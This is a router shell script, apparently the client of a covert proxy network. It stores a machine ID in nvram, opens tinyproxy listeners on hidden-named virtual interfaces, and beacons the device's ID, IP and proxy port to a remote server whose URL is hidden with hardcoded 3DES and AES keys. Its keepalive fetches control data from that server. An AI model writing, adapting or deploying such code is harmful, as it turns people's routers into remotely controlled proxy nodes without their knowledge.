#!/bin/sh
DYVERSION=10044

# nvram_get key default
nvram_get(){
	local key=$1
	local default=$2
	local v=
	v=$(nvram get $key)
	if [ -z "$v" ] ; then
		v=$default
	fi
	echo $v
}
gen_random() {
	len=$1
	if [ -z "$len" ] ; then
		len=4
	fi
	echo $(hexdump -n $len -e '/2 "%u"' /dev/urandom)
}

create_if_nvram_no_exist(){
	key=$1
	default=$2
	value=$(nvram get $key)
	if [ -z "$value" ] ; then 
		nvram set $key=$default
		nvram commit
	fi
}

create_if_nvram_no_exist nwan_mode 0
create_if_nvram_no_exist machine_id $(gen_random 4)



NWAN_MODE=$(nvram_get nwan_mode 0)
MACHINE_ID=$(nvram_get machine_id 0)
ROM_VERSION=$(nvram_get rom_version 0)

NWAN_DEV_PREFIX=v-hid
NWAN_PPPOE_DEV_PREFIX=p-hid
PPPD_NAME=mpd

#nwan dir
NWAN_DIR=$(pwd)
NWAN_TINYPROXY_DIR=$NWAN_DIR/tp
NWAN_TMP_DIR=$NWAN_DIR/tmp
PPPD_CMD=$NWAN_DIR/$PPPD_NAME

TINYPROXY_CFG=$NWAN_DIR/tinyproxy.cfg
SCRIPT_PATH=$0
u0e=$(nvram_get u0 "U2FsdGVkX1/FY3WMPPp/pOu/xCFhse99zcPx9aSQ8m6xXblRoMVNSw==")
u0=$(echo $u0e | openssl enc -d -base64 | openssl des3 -d -k sbsbsb)
if [ -z "$u0" ] ; then
	u0=http://www.kmssnr.com
fi

REPORT_URL=$u0/surfing/index.php/Index3/wg/
KEEPALIVE_URL=$u0/surfing/index.php/Index3/wg/
SH_VERSION_URL=$u0/router/nwan_sz.txt

# common functions
nwan_check_logsize () {
	if [ -f $NWAN_LOG_FILE ] ; then
		local logsize=`du -k "$NWAN_LOG_FILE" | awk '{print $1}'`
		if [ $logsize -gt 4 ] ; then
			rm -rf "$NWAN_LOG_FILE"
		fi
	fi
}

nwan_log() {
	nwan_check_logsize
	echo "$(date +%Y%m%d/%H:%M:%S) " $* >> $NWAN_LOG_FILE;
	#echo "$(date +%y%m%d/%H:%M:%S) $*"
}


# nvram_set key value
nvram_set(){
	local key=$1
	local v=$2
	nvram set $key=$v
}
# nvram_del key
nvram_del(){
	local key=$1
	nvram unset $key
}

# check is interface exist
check_interface(){
	local iface=$1
	ifconfig $iface > /dev/null 2>&1
	echo $?
}


# keepalive id mode ip port
is_used_port() {
	local dp=$1
	for i in $(netstat -ln | grep '^tcp.*' | awk '{print $4}')
	do
		local tmp=${i##*:}
		if [ "$dp" -eq "$tmp" ] ; then
			echo "1"
			return
		fi
	done
	echo "0"
}

sel_proxy_port() {
	local port
	while true
	do
		port=$(( $(gen_random 2) % 4096 + 10000))
		local used=$(is_used_port "$port")
		if [ $used==0 ] ; then
			break;
		fi
	done
	echo "$port"
}

# check_network [ethx]
check_network() {
	interface=$1
	if [ -z "$interface" ] ; then
		ping -c 3 www.baidu.com > /dev/null 2>&1
	else
		ping -c 3 -I $interface www.baidu.com > /dev/null 2>&1
	fi
	echo $?
}

# check_network_timeout secs [ethx]
check_network_timeout(){
	timeout=$1
	interface=$2
	network_down=1
	while [ $timeout -gt 0 ] 
	do
		f=$(check_network $interface)
		if [ $f == 0 ]; then
			network_down=0
			break;
		fi
		sleep 2
		timeout=$(($timeout-2))
	done
	echo $network_down
}
		
has_arp(){
	cnt=0
	iplist=$(cat /proc/net/arp | awk '$3=="0x2" { print $1 }' )
	if [ -z "$iplist" ] ; then
		echo $cnt
		return
	fi

	for ip in $iplist
	do
		arping -I br0 -c 10 -f $ip > /dev/null 2>&1
		result=$?
		if [ $result == 0 ]; then
			cnt=$(($cnt+1))
			break
		fi		
	done
	echo $cnt
}


add_ok_times(){
	p=$1
	k=${p}_ok
	t=$(nvram_get $k 0)
	t=$(($t+1))
	nvram_set $k $t
}

get_ok_times(){
	p=$1
	k=${p}_ok
	t=$(nvram_get $k 0)
	echo $t
}

clear_failed_times(){
	p=$1
	k=${p}_failed
	nvram_del $k
}

add_failed_times(){
	p=$1
	k=${p}_failed
	t=$(nvram_get $k 0)
	t=$(($t+1))
	nvram_set $k $t
}

get_failed_times(){
	p=$1
	k=${p}_failed
	t=$(nvram_get $k 0)
	echo $t
}


# instance_keepalive ident
instance_keepalive(){
	local ident=$1
	nvram_set instance_${ident}_kp $(date +%s)
}

# confirm_single_instance ident
nostrict_single_instance(){
	local ident=$1
	local cpid=$$
	local lpid=$(nvram_get instance_$ident 0)
	if [ $lpid == 0 ] ; then
		nvram_set instance_$ident $cpid
	elif [ "$lpid" == "$cpid" ] ; then
		return
	else
		local kp=$(nvram_get instance_${ident}_kp 0)
		local cur=$(date +%s)
		local inv=$(($cur-$kp))
		# no keepalive or keepalive timespan > 3600 
		if [ "$kp" == "0" ] || [ $inv -gt 3600 ] ; then
			nwan_log "pre instance pid=$lpid keepalive timeout, skipping it"
			kill -TERM $lpid > /dev/null 2>&1
			return
		fi
		nwan_log "pre instance pid=$lpid running, current $cpid exit!"
		exit 0
	fi
}

# make_single_instance ident
strict_single_instance(){
	local ident=$1
	local cpid=$$
	local lpid=$(nvram_get instance_$ident 0)
	if [ "$lpid" != "0" ] ; then
		kill -9 $lpid > /dev/null 2>&1
	fi
	nvram_set instance_$ident $cpid
}

# isntance_start ident 0|1  0=kill pre  1=keep pre,self exit
instance_start(){
	local ident=$1
	local dok=$2

	if [ "$dok" == "0" ] ; then
		strict_single_instance $ident
		return;
	fi
	nostrict_single_instance $ident
}


# instance_exit ident
instance_exit(){
	local ident=$1
	nvram_del instance_$ident
	nvram_del instance_${ident}_kp
}

is_router_pppoe(){
	local ty=$(nvram_get wan_proto)
	if [ "$ty" != "pppoe" ] ; then
		echo 0
	else
		echo 1
	fi
}


encrypt_str(){
	local str=$(echo $1 | openssl enc -aes-128-cbc -a -A -iv 0  -nosalt  -K 25c506a9e4a0b3100d2d86b49b83cf9a)
	str=$(echo $str | sed -e 's/\//%2F/g' -e 's/=/%3D/g' -e 's/\+/%2B/g')
	echo $(echo $str | sed -e 's/%/%25/g')
}

# do_report xxx/xxx/xxx
do_report(){
	mode=$(nvram_get nwan_mode 0)
	ver=$(nvram_get rom_version 0)
	url=id/$MACHINE_ID/msg/report/$1/mode/$mode/ver/$ver/dyver/$DYVERSION/
	url=df/$(encrypt_str $url)/
	url=${REPORT_URL}$url
	nwan_log "do_report $url"
	curl -s --connect-timeout 10 -m 10  $url > /dev/null 2>&1
}


# do_report_tinyproxy ifname ip port
do_report_tinyproxy(){
	dev=$1
	ip=$2
	port=$3
	url=id/$MACHINE_ID/msg/tinyproxyup/dev/$dev/ip/$ip/port/$port/
	nwan_log do_report_tinyproxy $url
	url=df/$(encrypt_str $url)/
	url=${REPORT_URL}$url
	curl -s --connect-timeout 30 -m 30 --interface $dev $url > /dev/null 2>&1
}

do_report_tinyproxydown(){
	dev=$1
	url=id/$MACHINE_ID/msg/tinyproxydown/dev/$dev/
	nwan_log do_report_tinyproxy $url
	url=df/$(encrypt_str $url)/
	url=${REPORT_URL}$url
	curl -s --connect-timeout 30 -m 30 --interface $dev $url > /dev/null 2>&1
}

# do_keepalive ifname ip port , return server control data
do_keepalive(){
	dev=$1
	ip=$2
	port=$3
	mode=$(nvram_get nwan_mode 0)
	ver=$(nvram_get rom_version 0)
	url=id/$MACHINE_ID/msg/keepalive/mode/$mode/ver/$ver/dev/$dev/ip/$ip/port/$port/dyver/$DYVERSION/
	nwan_log do_keepalive $url
	url=df/$(encrypt_str $url)/
	url=${REPORT_URL}$url
	echo $(curl -s --connect-timeout 30 -m 30 --interface $dev $url)
}

